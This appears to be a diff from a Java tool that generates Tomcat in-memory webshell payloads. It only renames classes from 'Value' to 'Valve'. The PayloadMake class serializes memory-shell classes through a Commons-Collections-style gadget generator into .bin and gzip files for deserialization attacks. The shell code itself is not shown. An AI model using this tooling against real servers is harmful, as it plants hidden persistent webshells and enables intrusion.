@@ -5,8 +5,8 @@ import com.demo.memshell.exec.TomcatListenerJMXMS;
 import com.demo.memshell.exec.TomcatListenerThreadMS;
 import com.demo.memshell.exec.executor.TomcatExecutorExecMS;
 import com.demo.memshell.exec.executor.TomcatExecutorThreadLoader;
-import com.demo.memshell.exec.valve.TomcatValueExecMS;
-import com.demo.memshell.exec.valve.TomcatValueThreadLoader;
+import com.demo.memshell.exec.valve.TomcatValveExecMS;
+import com.demo.memshell.exec.valve.TomcatValveThreadLoader;
 import me.gv7.tools.josearcher.entity.Blacklist;
 import me.gv7.tools.josearcher.entity.Keyword;
 import me.gv7.tools.josearcher.searcher.SearchRequstByBFS;
@@ -54,13 +54,13 @@ public class PayloadMake {
         cc4Generator.makeFile(msmClass, String.format("dev/%s.bin", msmClass.getSimpleName()));
         GZIPMaker.gzipMaker(TomcatExecutorExecMS.class.getName());
 
-        msmClass = TomcatValueThreadLoader.class;
+        msmClass = TomcatValveThreadLoader.class;
         System.out.println(msmClass.getName());
         cc4Generator = new CC4Generator();
         payload = cc4Generator.make(msmClass);
         System.out.println(payload.length());
         cc4Generator.makeFile(msmClass, String.format("dev/%s.bin", msmClass.getSimpleName()));
-        GZIPMaker.gzipMaker(TomcatValueExecMS.class.getName());
+        GZIPMaker.gzipMaker(TomcatValveExecMS.class.getName());
     }
 
     public void searchTomcat() {
